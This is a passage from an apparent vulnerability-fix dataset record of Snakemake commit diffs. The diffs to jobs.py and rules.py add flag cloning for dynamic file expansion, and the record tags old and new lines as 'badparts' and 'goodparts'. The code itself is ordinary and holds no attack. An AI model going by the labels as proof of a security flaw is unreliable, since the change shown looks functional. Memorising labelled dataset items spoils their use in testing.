expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n", "add": 34, "remove": 1, "filename": "/snakemake/jobs.py", "badparts": ["                    yield IOFile(f, self.rule)"], "goodparts": ["                    fileToYield = IOFile(f, self.rule)", "                    fileToYield.clone_flags(f_)", "                    yield fileToYield", "            else:", "                yield f", "    @property", "    def expanded_input(self):", "        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"", "        for f, f_ in zip(self.input, self.rule.input):", "            if not type(f_).__name__ == \"function\":", "                if type(f_.file).__name__ not in [\"str\", \"function\"]:", "                    if contains_wildcard(f_):", "                        expansion = self.expand_dynamic(", "                            f_,", "                            restriction=self.wildcards,", "                            omit_value=_IOFile.dynamic_fill)", "                        if not expansion:", "                            yield f_", "                        for f, _ in expansion:", "                            fileToYield = IOFile(f, self.rule)", "                            fileToYield.clone_flags(f_)", "                            yield fileToYield", "                    else:", "                        yield f", "                else:", "                    yield f"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"}, "/snakemake/remote_providers/__init__.py": {"changes": [{"diff": "-0,", "add": 0, "remove": 0, "filename": "/snakemake/remote_providers/__init__.py", "badparts": ["0,"], "goodparts": []}]}, "/snakemake/rules.py": {"changes": [{"diff": "\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re", "add": 6, "remove": 1, "filename": "/snakemake/rules.py", "badparts": ["                        expansion[i].append(IOFile(e, rule=branch))"], "goodparts": ["                        ioFile = IOFile(e, rule=branch)", "                        ioFile.clone_flags(f)", "                        expansion[i].append(ioFile)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = 